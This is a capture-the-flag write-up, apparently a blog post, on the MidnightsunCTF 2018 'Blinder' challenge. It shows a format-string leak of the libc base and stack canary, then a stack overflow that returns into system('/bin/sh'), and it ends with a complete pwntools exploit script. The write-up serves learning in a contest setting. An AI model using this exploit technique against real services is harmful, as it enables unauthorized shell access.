---
layout: post
category: Pwn
title: MidnightsunCTF finals 2018 Blinder Pwn
tags: 
    - kowu
---

We got a libc and an ip:port. It asks for a name, echos it, and the asks us what it can help us with. Then it exits. The name echoing has a formatstring vuln, the second input has a buffer overflow. There is a stack canary, the binary is 32 bit. As libc is already given exploitation is a piece of cake.

I first dumped the stack till `__libc_start_main_ret` (reconnecting everytime). Knowing the static offset I could now retrieve libc base reliable with `%291$p`. In the stackdump I already saw something what looked like a stack canary, I confirmed this by writing one byte inside it which caused a sigsegv. So by `%267$p` I could retrieve the canary. Now we know everything for successfull exploitation. In the first step we leak libc and canary, in the second step we overwrite the ret pointer with system and place "/bin/sh" as the first argument on the stack. Done.

```python
r = remote("52.210.10.146", 6666)
r.recvuntil("Welcome! What is your name?")
r.sendline("%291$p_%267$p")
r.recvuntil("Hello ")
res = r.recvuntil("What")[:-4].strip().split("_")

libcbase = int(res[0], 16) - 0x18e81
canary = int(res[1], 16)

log.info("libcbase 0x{:x}".format(libcbase))
r.recvuntil("can we help you with today?")
r.sendline("A" * 1024 + struct.pack("<IIIIIII", canary, 0, 0, 0, libcbase + 0x3cd10, 0, libcbase + 0x17b8cf))
r.interactive()
```
